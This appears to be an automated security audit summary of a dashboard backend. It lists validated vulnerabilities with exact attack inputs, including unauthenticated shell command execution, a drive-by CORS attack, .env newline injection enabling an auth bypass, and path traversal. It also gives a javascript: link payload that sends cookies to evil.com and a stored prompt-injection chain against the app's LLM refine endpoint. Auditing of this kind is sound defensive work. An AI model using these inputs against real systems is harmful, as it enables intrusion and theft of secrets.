# Deep Probe Summary: dashboard-backend

Status: complete
Loops: 2
Total hypotheses: 25 (12 from Round 1, 12 from Round 2, 1 additional from Round 3 causal review)
Validated: 23
Needs-Deeper: 1 (PH-21 — read_room subprocess side effect via working_dir injection)
Invalidated (scope): 1 (CROSS-05 traditional XSS — blocked by escapeHtml; reclassified as CV-11 javascript: URI XSS)
Stop reason: All entry points covered; no significant coverage gaps remain; only PH-21 has low severity and complex preconditions.

---

## Validated Hypotheses

### PH-01: Unauthenticated Arbitrary OS Command Execution via /api/shell
- Reasoning-Model: Pre-Mortem
- Target: `dashboard/routes/system.py:166` — `shell_command`
- Attack input: `POST /api/shell?command=id` (no credentials, no body)
- Code path: `system.py:167 (command: str query param)` → `system.py:168 subprocess.run(command, shell=True)`
- Sanitizers on path: NONE
- Security consequence: Full OS command execution as server process user. Read /etc/passwd, ~/.ostwin/.env, establish reverse shells, pivot to internal systems.
- Severity estimate: CRITICAL
- Evidence file: round-1-evidence.md

### PH-02: Drive-by RCE via CORS Wildcard + /api/shell
- Reasoning-Model: Pre-Mortem
- Target: `dashboard/api.py:108` — CORSMiddleware + `system.py:166` — `shell_command`
- Attack input: Malicious webpage JavaScript `fetch("http://localhost:9000/api/shell?command=...", {method:"POST"})`
- Code path: CORS allow_origins=["*"] → browser allows cross-origin request → shell_command execution
- Sanitizers on path: NONE. `allow_credentials` defaults False but unauthenticated endpoint doesn't need cookies.
- Security consequence: Drive-by RCE — any user who visits a malicious page while dashboard runs on localhost is compromised. No user interaction beyond page visit required.
- Severity estimate: CRITICAL
- Evidence file: round-1-evidence.md

### PH-03: Telegram Bot Token Theft via Unauthenticated GET /api/telegram/config
- Reasoning-Model: Pre-Mortem
- Target: `dashboard/routes/system.py:148` — `get_telegram_config`
- Attack input: `GET /api/telegram/config` (no auth)
- Code path: `system.py:149 telegram_bot.get_config()` → returns {bot_token, chat_id}
- Sanitizers on path: NONE
- Security consequence: Bot token theft enables full Telegram bot impersonation — read chat history, send messages, receive all notifications. Combines with PH-04 for notification hijacking.
- Severity estimate: HIGH
- Evidence file: round-1-evidence.md

### PH-04: Telegram Config Overwrite — Redirect Notifications to Attacker Bot
- Reasoning-Model: Pre-Mortem
- Target: `dashboard/routes/system.py:152` — `save_telegram_config`
- Attack input: `POST /api/telegram/config` with `{"bot_token": "<attacker>", "chat_id": "<attacker>"}`
- Code path: `system.py:154 telegram_bot.save_config(config.bot_token, config.chat_id)` → overwrites telegram_config.json
- Sanitizers on path: Pydantic type validation only (str, str); no format validation
- Security consequence: All system notifications redirected to attacker's Telegram bot. Legitimate owner loses alerting. Attacker receives real-time operational intelligence.
- Severity estimate: HIGH
- Evidence file: round-1-evidence.md

### PH-05: Unauthenticated Subprocess Execution via /api/run_pytest_auth
- Reasoning-Model: Pre-Mortem
- Target: `dashboard/routes/system.py:171` — `run_pytest_auth`
- Attack input: `GET /api/run_pytest_auth` (no auth, no params)
- Code path: `system.py:175 asyncio.create_subprocess_exec("python3", "-m", "pytest", str(PROJECT_ROOT / "test_auth.py"), "-v")`
- Sanitizers on path: Command is fixed (not injectable from input); but no auth
- Security consequence: Any client can trigger pytest execution (CPU/disk DoS). Test output returned to caller — may include sensitive values in assertions. Analogous unauthenticated endpoint `GET /api/test_ws` runs test_ws.py subprocess.
- Severity estimate: HIGH
- Evidence file: round-1-evidence.md

### PH-06: DEBUG Bypass — OSTWIN_API_KEY=DEBUG Disables All Authentication
- Reasoning-Model: Pre-Mortem
- Target: `dashboard/auth.py:79` — `get_current_user`
- Attack input: Any request to any auth-gated endpoint with optional `X-User: admin` header
- Code path: `auth.py:79 if _API_KEY == "DEBUG": username = request.headers.get("x-user", "debug-user"); return {"username": username}`
- Sanitizers on path: NONE when DEBUG mode active
- Security consequence: All authenticated endpoints become fully unauthenticated. Identity can be spoofed to any value. Affects ALL routes using `Depends(get_current_user)`: POST /api/env, GET /api/fs/browse, POST /api/run, GET /api/config, etc.
- Severity estimate: CRITICAL (conditional on OSTWIN_API_KEY=DEBUG configuration)
- Evidence file: round-1-evidence.md

### PH-07/PH-08: Env File Injection — Persist DEBUG Bypass Across Restarts
- Reasoning-Model: Pre-Mortem
- Target: `dashboard/routes/system.py:254` — `save_env` + `dashboard/routes/system.py:52` — `_serialize_env`
- Attack input: `POST /api/env` with `{"entries": [{"type": "var", "key": "SAFE", "value": "x\nOSTWIN_API_KEY=DEBUG", "enabled": true}]}`
- Code path: `system.py:65 lines.append(f"{key}={value}")` — no newline sanitization → `_ENV_FILE.write_text(content)` → on next startup `load_dotenv(_env_file, override=False)` loads `OSTWIN_API_KEY=DEBUG` if not already in env → `auth.py:79` DEBUG bypass activates
- Sanitizers on path: `_serialize_env` has NO sanitization of newlines in key/value fields; `load_dotenv(override=False)` only takes effect on restart
- Security consequence: Authenticated attacker (or DEBUG-mode attacker) can permanently activate the DEBUG bypass on next server restart. Persistent, survives log rotation and container restarts.
- Severity estimate: HIGH (auth required; activates CRITICAL bypass)
- Evidence file: round-1-evidence.md

### PH-09: Filesystem Browse Without Jail — Full Filesystem Enumeration
- Reasoning-Model: Pre-Mortem
- Target: `dashboard/routes/system.py:273` — `browse_filesystem`
- Attack input: `GET /api/fs/browse?path=/etc` or `GET /api/fs/browse?path=/`
- Code path: `system.py:277 target = Path(path).expanduser().resolve()` → `system.py:282 for entry in sorted(target.iterdir()):` — no base directory check
- Sanitizers on path: `.expanduser().resolve()` normalizes; `is_dir()` check; dotfile names filtered from output. NO containment check.
- Security consequence: Authenticated attacker (or via DEBUG bypass) enumerates entire filesystem — /etc, /home, /var, mounted volumes. Reveals application structure for targeted follow-on attacks.
- Severity estimate: MEDIUM (auth required)
- Evidence file: round-1-evidence.md

### PH-10: Unauthenticated Second-Order LLM Prompt Injection
- Reasoning-Model: Pre-Mortem
- Target: `dashboard/routes/plans.py:461` — `create_plan` → `dashboard/routes/plans.py:1128` — `refine_plan_endpoint`
- Attack input: Step 1: `POST /api/plans/create` with malicious content; Step 2: `POST /api/plans/refine` with returned plan_id
- Code path: Step 1: `plans.py:472 plan_file.write_text(request.content)` (no auth); Step 2: `plans.py:1134-1138 plan_content = p_file.read_text()` → `refine_plan(user_message=..., plan_content=plan_content)` (no auth) → LLM processes injected content
- Sanitizers on path: NONE at either step. plan_id returned directly in create response (no need for reconnaissance).
- Security consequence: LLM processes attacker-injected content — data exfiltration of system prompt and context, misleading responses, extraction of plan/role structure.
- Severity estimate: HIGH
- Evidence file: round-1-evidence.md / round-3-hypotheses.md (CV-02)

### PH-11: Room ID Path Traversal — Write Status File One Level Above WARROOMS_DIR
- Reasoning-Model: Pre-Mortem
- Target: `dashboard/routes/rooms.py:228` — `room_action`
- Attack input: `POST /api/rooms/../action?action=stop`
- Code path: `rooms.py:231 room_dir = WARROOMS_DIR / ".."` → `rooms.py:232 room_dir.exists()` = True (parent dir exists) → `rooms.py:237 status_file.write_text("failed-final")` → writes `status` file in project parent directory
- Sanitizers on path: Action value is allowlisted (safe strings only written). BUT room_dir.exists() allows traversal. FastAPI {room_id} non-path param DOES match ".." (confirmed via Starlette compile_path test).
- Security consequence: Write a file named "status" containing "failed-final", "paused", or "pending" to any ancestor directory of WARROOMS_DIR that exists. Limited impact (only these three strings, to a file named "status") but demonstrates unvalidated path composition.
- Severity estimate: MEDIUM
- Evidence file: round-1-evidence.md, probe-state.json (Loop 2)

### PH-12: Unauthenticated Plan Status Mutation
- Reasoning-Model: Pre-Mortem
- Target: `dashboard/routes/plans.py:768` — `update_plan_status`
- Attack input: `POST /api/plans/<plan_id>/status` with `{"status": "failed"}`
- Code path: `plans.py:774-775 meta["status"] = request.get("status", ...); meta_file.write_text(...)` — no auth, unvalidated status string
- Sanitizers on path: None. plan_id used directly in `plans_dir / f"{plan_id}.meta.json"`.
- Security consequence: Arbitrary plan status mutation disrupts workflow orchestration. Plan IDs discoverable via unauthenticated GET /api/search/plans.
- Severity estimate: MEDIUM
- Evidence file: round-1-evidence.md

### PH-13: Raw API Key Returned in Login Response Body
- Reasoning-Model: Contradiction
- Target: `dashboard/routes/auth.py:43` — `login_for_access_token`
- Attack input: Observe network traffic or browser devtools during login; or exploit CV-11 XSS to fetch login response
- Code path: `auth.py:43-44 JSONResponse(content={"access_token": _API_KEY, ...})` — raw permanent secret in JSON body
- Sanitizers on path: Cookie set with httponly=True but the cookie protection is fully negated by including the same value in the JSON body.
- Security consequence: API key visible in browser devtools, server logs, proxy logs, and any logging middleware. Key never rotates. Compromise provides 30-day persistent access (cookie max_age).
- Severity estimate: HIGH
- Evidence file: round-1-evidence.md

### PH-14: Cookie Missing secure=True — Plaintext Transmission Over HTTP
- Reasoning-Model: Contradiction
- Target: `dashboard/routes/auth.py:48` — `set_cookie`
- Attack input: MITM on LAN while victim uses dashboard over HTTP
- Code path: `auth.py:48-55` — `response.set_cookie(key=AUTH_COOKIE_NAME, value=_API_KEY, httponly=True, samesite="lax", ...)` — no `secure=True`
- Sanitizers on path: `httponly=True` and `samesite="lax"` provide partial protection. Missing `secure=True` means over HTTP the raw API key is in plaintext headers.
- Security consequence: Network-adjacent attacker intercepts the API key from any HTTP request. 30-day persistent access.
- Severity estimate: MEDIUM
- Evidence file: round-1-evidence.md

### PH-16: WebSocket /api/ws — No Auth, Full Internal Event Broadcast
- Reasoning-Model: Contradiction
- Target: `dashboard/api.py:86` — `websocket_endpoint`
- Attack input: `ws://localhost:9000/api/ws` — connect and listen
- Code path: `api.py:87 await manager.connect(websocket)` (no auth) → `global_state.py:29 await manager.broadcast(event_dict)` on all internal events → all clients receive all events
- Sanitizers on path: JSON parsing only. No auth. No per-client filtering.
- Security consequence: Real-time surveillance of all internal operations: plan IDs, room state transitions, agent action notifications, error messages with stack traces and sensitive paths.
- Severity estimate: MEDIUM
- Evidence file: round-1-evidence.md

### PH-17: fe_catch_all Static File Server — Path Traversal (Latent)
- Reasoning-Model: Contradiction
- Target: `dashboard/api.py:147` — `fe_catch_all`
- Attack input: `GET /../../dashboard/auth.py` (when FE_OUT_DIR exists, i.e., production deployment)
- Code path: `api.py:149 exact = FE_OUT_DIR / path` — Python Path does NOT normalize `..` — `api.py:150 if exact.is_file(): return FileResponse(str(exact))` — OS resolves `..` during stat/open
- Sanitizers on path: NONE. Only `is_file()` presence check. No containment verification against FE_OUT_DIR.
- Security consequence: When FE_OUT_DIR is built (production), attacker can read any file the server process can access: auth.py (reveals DEBUG condition), plans.py (source code), ~/.ostwin/.env (API key), /etc/passwd. Currently LATENT (FE_OUT_DIR does not exist in dev). Confirmed: uvicorn does NOT normalize `..` in URL paths; FastAPI {path:path} converter passes `..` verbatim.
- Severity estimate: HIGH (when deployed with built frontend)
- Evidence file: round-3-hypotheses.md (CV-04), probe-state.json (Loop 2)

### PH-18: Post-Auth X-User Header Identity Spoofing
- Reasoning-Model: Contradiction
- Target: `dashboard/auth.py:96` — `get_current_user` post-auth section
- Attack input: Any authenticated request with `X-User: admin` header
- Code path: `auth.py:96-97` — after valid key check, `username = request.headers.get("x-user", "api-key-user")` overrides identity. Also applies in DEBUG mode with no key.
- Sanitizers on path: None on X-User header value
- Security consequence: Any key holder can spoof identity to any username. In DEBUG mode, unauthenticated attackers can impersonate any user. Currently no RBAC decisions use username — impact escalates if RBAC added in future.
- Severity estimate: MEDIUM (current) → HIGH (if RBAC added)
- Evidence file: round-1-evidence.md

### PH-19: verify_password Always Returns True (Dormant)
- Reasoning-Model: Contradiction
- Target: `dashboard/auth.py:29` — `verify_password`
- Attack input: Any call to verify_password(any_password, any_hash)
- Code path: `auth.py:29-30 def verify_password(...): return True`
- Sanitizers on path: None — function body is `return True`
- Security consequence: Currently dormant (function not called in auth flow). Will accept any password if ever invoked. High risk if password-based auth flow added in future.
- Severity estimate: MEDIUM (dormant) → HIGH (if called)
- Evidence file: round-1-evidence.md

### PH-20: working_dir Injection in Plan Meta → Attacker-Controlled Room Path Resolution
- Reasoning-Model: Abductive
- Target: `dashboard/routes/plans.py:469,478` — `create_plan` meta write → `dashboard/api_utils.py:653` — `resolve_plan_warrooms_dir`
- Attack input: `POST /api/plans/create` with `{"path": "/tmp", "working_dir": "/attacker/path"}`
- Code path: `plans.py:478 meta["warrooms_dir"] = str(Path(working_dir) / ".war-rooms")` → `api_utils.py:661-670 resolve_plan_warrooms_dir()` reads working_dir from meta → returns `Path("/attacker/path/.war-rooms")` — no validation of absolute paths
- Sanitizers on path: None. CreatePlanRequest does not validate working_dir.
- Security consequence: All plan-scoped room lookups (resolve_plan_warrooms_dir called 18+ times across plans.py) use attacker-controlled base path. Enables CROSS-03 chain if attacker can write files to target directory.
- Severity estimate: MEDIUM
- Evidence file: round-3-hypotheses.md (CV-03)

### PH-22: SSE /api/events — Unauthenticated Real-Time Internal Event Feed
- Reasoning-Model: Abductive
- Target: `dashboard/routes/rooms.py:159` — `sse_events`
- Attack input: `GET /api/events` with `Accept: text/event-stream`
- Code path: `rooms.py:163 queue = await global_state.broadcaster.subscribe_sse()` (no auth) → all broadcaster.broadcast() calls deliver to subscriber
- Sanitizers on path: None. All fields included. No per-subscriber filtering.
- Security consequence: Persistent real-time surveillance of room state changes, plan updates, agent notifications. Reveals room IDs, plan activity, error details.
- Severity estimate: MEDIUM
- Evidence file: round-1-evidence.md

### PH-23: advance_room_state Writes Arbitrary String to status File
- Reasoning-Model: Contradiction
- Target: `dashboard/routes/rooms.py:250` — `advance_room_state`
- Attack input: `POST /api/rooms/<room_id>/advance` with `{"target_state": "<arbitrary_string>"}`
- Code path: `rooms.py:268 status_file.write_text(target_state)` — no allowlist, no max length
- Sanitizers on path: Only presence check (`if not target_state: 400`). Compare: unauthenticated room_action HAS allowlist; authenticated advance_room_state does NOT.
- Security consequence: Authenticated user can write arbitrary strings to room status file. Could corrupt orchestration state, trigger undefined behavior in state machine, or DoS via very long input.
- Severity estimate: MEDIUM
- Evidence file: round-1-evidence.md

### PH-24: plan_id Path Traversal in Unauthenticated Endpoints
- Reasoning-Model: Contradiction
- Target: `dashboard/routes/plans.py:768` — `update_plan_status`, `plans.py:1188` — `get_plan_epics`
- Attack input: `POST /api/plans/../status` with `{"status": "injected"}`
- Code path: FastAPI {plan_id} non-path param matches ".." → `plans.py:770 meta_file = plans_dir / f"{'..').meta.json"` = `plans_dir/../.meta.json` → read/write one level above PLANS_DIR
- Sanitizers on path: None. `.meta.json` suffix limits exploitable target.
- Security consequence: Read or write .meta.json files one directory above PLANS_DIR. Currently limited by extension suffix. Demonstrates broader path validation gap across all plan_id uses.
- Severity estimate: MEDIUM
- Evidence file: probe-state.json (Loop 2)

### CV-11: javascript: URI XSS via Markdown Renderer Link URLs
- Reasoning-Model: Causal (discovered during Round 3 verification)
- Target: `dashboard/fe/src/lib/markdown-renderer.tsx:90` — link href assignment
- Attack input: Plan content containing `[click me](javascript:navigator.sendBeacon('https://evil.com/',document.cookie))`
- Code path: `markdown-renderer.tsx:88-91` — `href={match[2]}` sets URL directly on anchor with no scheme validation; `escapeHtml` applied to text content only, NOT href
- Sanitizers on path: `escapeHtml` applied to text but NOT to URL. `rel="noopener noreferrer"` prevents window.opener abuse but does NOT prevent javascript: execution.
- Security consequence: Attacker plants malicious plan via unauthenticated create. When authenticated user views and clicks the link in the plan editor, javascript: URI executes in their browser context. Can attempt cookie exfiltration, fetch authenticated API endpoints, or issue API calls. Note: `httponly=True` blocks direct cookie access, but authenticated API calls (e.g., GET /api/env to read secrets) can be made.
- Severity estimate: MEDIUM (requires user click)
- Evidence file: round-3-hypotheses.md (CV-11)

---

## NEEDS-DEEPER

### PH-21: read_room Subprocess Side Effect via Filesystem Plant
- Why unresolved: The subprocess command (`pwsh -File debug_test.ps1`) is hardcoded and not injectable from user input. The vulnerability exists at the mechanism level (file presence triggers subprocess), but impact depends on debug_test.ps1 content which was not found in scope. The full chain (working_dir injection → attacker-writable directory → file plant → authenticated trigger) has multiple fragile preconditions.
- Suggested follow-up for Phase 8: Locate and review `.agents/debug_test.ps1` content. Assess whether the script has side effects exploitable via controlled invocation. Determine if `/tmp` or other world-writable paths can be used as working_dir to establish the chain.

---

## Attack Chain Highlights

### Chain 1: Zero-Auth Full Host Compromise
```
POST /api/shell?command=cat+~/.ostwin/.env → read API key
                                           → establish reverse shell
                                           → escalate via other vulns
```
Precondition: Network access only.

### Chain 2: Drive-by RCE (no network access required)
```
Victim visits malicious page → JS fetch to localhost:9000/api/shell → RCE
```
Precondition: Victim on same machine or LAN, dashboard running.

### Chain 3: Unauthenticated to Authenticated-Equivalent via Env Injection
```
1. Authenticate (or use DEBUG mode)
2. POST /api/env with newline injection → OSTWIN_API_KEY=DEBUG in .env
3. Restart server (via /api/stop + external trigger)
4. All auth bypassed via DEBUG mode
```

### Chain 4: Stored Payload → LLM Exfiltration
```
1. POST /api/plans/create with injection payload (no auth)
2. plan_id returned in response
3. POST /api/plans/refine with plan_id (no auth)
4. LLM processes attacker content → outputs sensitive context
```

---

## Coverage Summary

| Entry Point | backward-reasoner | contradiction-reasoner | causal-verifier |
|------------|:-:|:-:|:-:|
| POST /api/shell | PH-01, PH-02 | — | CV-07 |
| GET /api/run_pytest_auth | PH-05 | — | — |
| GET /api/test_ws | PH-05 | — | — |
| GET /api/telegram/config | PH-03 | — | — |
| POST /api/telegram/config | PH-04 | — | — |
| POST /api/telegram/test | PH-04 | — | — |
| POST /api/plans/create | PH-10 | PH-20 | CV-02, CV-05 |
| POST /api/plans/refine | PH-10 | — | CV-02 |
| POST /api/plans/{id}/status | PH-12 | PH-24 | — |
| GET /api/events | PH-22 | PH-22 | — |
| GET /api/search | — | PH-22 | — |
| GET /api/rooms/{id}/state | — | PH-22 | — |
| POST /api/rooms/{id}/action | PH-11 | — | — |
| WS /api/ws | — | PH-16 | — |
| POST /api/auth/token | — | PH-13, PH-14 | CV-05 |
| get_current_user (DEBUG) | PH-06 | PH-18, PH-19 | CV-06 |
| POST /api/env | PH-07, PH-08 | — | CV-01, CV-08 |
| GET /api/fs/browse | PH-09 | — | — |
| GET /{path:path} (fe_catch_all) | — | PH-17 | CV-04, CV-10 |
| POST /api/rooms/{id}/advance | — | PH-23 | — |
| read_room() subprocess | — | PH-21 | CV-09 |
| CORS middleware | PH-02 | PH-15 | CV-01 |
| markdown-renderer.tsx | — | — | CV-11 |
